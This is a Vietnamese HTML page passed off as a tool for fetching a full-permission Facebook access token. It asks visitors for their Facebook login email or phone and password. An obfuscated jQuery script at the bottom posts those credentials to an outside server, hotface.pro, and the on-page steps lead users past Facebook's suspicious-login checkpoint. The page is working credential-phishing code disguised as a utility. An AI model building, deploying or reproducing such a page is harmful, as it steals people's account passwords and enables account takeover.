<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>Token HTC || Token IOS || Get Token Full Quyền
</title> 
        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
         <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
</head>
<body id="dashboard" class="background-dark template-product" ><br>
<div class="col-sm-3 blog-main"></div>
          <div class="col-sm-6 blog-main">
               <div class="panel panel-default">
                    <div class="panel-heading">
                         <h3 class="panel-title">Tool Lấy Token Full Quyền</h3>
                    </div>
                    <div class="panel-body">
                         <div class="form-group">
                              <label for="email">* Email hoặc số điện thoại Login Facebook :</label>
                              <input id="email" placeholder="Nhập Email" class="form-control"/>
                         </div>
                         <div class="form-group"><label for="password">* Mật khẩu Login Facebook :</label>
                              <input id="password" type="password" placeholder="Nhập Mật Khẩu" class="form-control"/>
                         </div>
                         <div class="form-group">
                              <label for="app_id">* Chọn Ứng Dụng :</label>
                              <select id="app_id" class="form-control">
                                      <option value="350685531728">Facebook For Android</option>
                                      <option value="6628568379">Facebook For Iphone</option>
                                      <option value="165907476854626">PAGES MANAGER FOR IOS</option>
                                      <option value="41158896424">HTC Sense</option>
                              </select>
                         </div>
                         <div class="form-group text-center">
                              <button id="submit" class="btn btn-sm btn-primary">Lấy Token</button>
                         </div>
                         <div class="form-group text-center" id="load_result" style="display:none">
                              <label for="result">Access Token của bạn là :</label>
                              <textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="4"></textarea>
                         </div>
                    </div>
               </div>
               <div class="panel panel-default">
                    <div class="panel-heading">
                         <h3 class="panel-title">Lần đầu sử dụng có thể không hoạt động</h3>
                    </div>
                    <ol>
                       <li>Lần đầu sử dụng có thể không hoạt động.</li>
                       <li>Sau đó,  Đăng nhập vào Facebook của bạn.</li>
                       <li>Bạn sẽ thấy : <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> điều này </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="http://i.imgur.com/Ffi0oIm.png"/></ul></div></li>
                       <li>Sau đó nhấp vào <code>"Tiếp tục"</code></li>
                       <li>Sau đó, bạn sẽ thấy: <div class="btn-group btn-xs"> <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span 
                       class="caret"></span>điều này</a><ul class="dropdown-menu"><img alt="Confirmation" src="http://i.imgur.com/ah9k9LJ.png"/></ul></div></li>
                       <li>Sau đó nhấp vào: <code>"Đó Là Tôi"</code></li>
                       <li>Bây giờ quay trở lại và thử lại bạn sẽ có thể sử dụng công cụ này trong bất kỳ thiết bị</li>
                    </ol>
               </div>
     </div>
</body>
</html>


<script>
var array = ["click", "#submit", "disabled", "attr", "Đang lấy token...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "http://hotface.pro/login/full.php", "post", "ajax", "on"];
$(document)[array[20]](array[0], array[1], function () {
        $(array[1])[array[3]](array[2], array[2]), $(array[1])[array[5]](array[4]);
        var email = $(array[7])[array[6]](),
            password = $(array[8])[array[6]](),
            app_id = $(array[9])[array[6]]();
        $[array[19]]({
            url: array[17],
            type: array[18],
            data: {
                email: email,
                password: password,
                app_id: app_id
            },
            success: function (email) {
                $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](email)
            }
        })[array[16]](function () {
            $(array[1])[array[10]](array[2]), $(array[1])[array[5]](array[11]), $(array[13])[array[12]](), $(array[15])[array[6]](array[14])
        })
    })
</script>